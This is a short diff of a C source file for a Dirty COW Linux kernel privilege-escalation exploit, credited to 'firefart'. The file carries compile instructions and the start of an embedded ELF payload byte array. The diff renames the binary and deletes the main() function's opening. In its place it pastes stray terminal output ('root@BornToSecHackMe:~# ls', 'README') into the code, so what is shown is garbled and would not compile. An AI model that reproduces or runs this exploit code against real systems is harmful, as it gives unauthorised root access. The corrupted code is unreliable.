@@ -6,10 +6,10 @@
 //   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
 //
 // Compile with:
-//   gcc -pthread dirtyc0w_ssh_key.c -o dirtyc0w_ssh_key -lcrypt
+//   gcc -pthread dirtyc0w_ssh.c -o dirtyc0w_ssh -lcrypt
 //
 // Then run the newly create binary by either doing:
-//   "./dirtyc0w_ssh_key"
+//   "./dirtyc0w_ssh"
 //
 // Exploit adopted by Christian "firefart" Mehlmauer
 // https://firefart.at
@@ -68,14 +68,8 @@ int copy_file(const char *from, const char *to)
     printf("%s successfully backed up to %s\n", from, to);
     fclose(source);
     fclose(target);
-    return (0);
-}
-
-int main(int argc, char *argv[])
-{
-    // backup file
-    if (copy_file(filename, backup_filename))
-        exit(1);
+    return (0);root@BornToSecHackMe:~# ls
+    README
 
     unsigned char payload[] = {
         0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
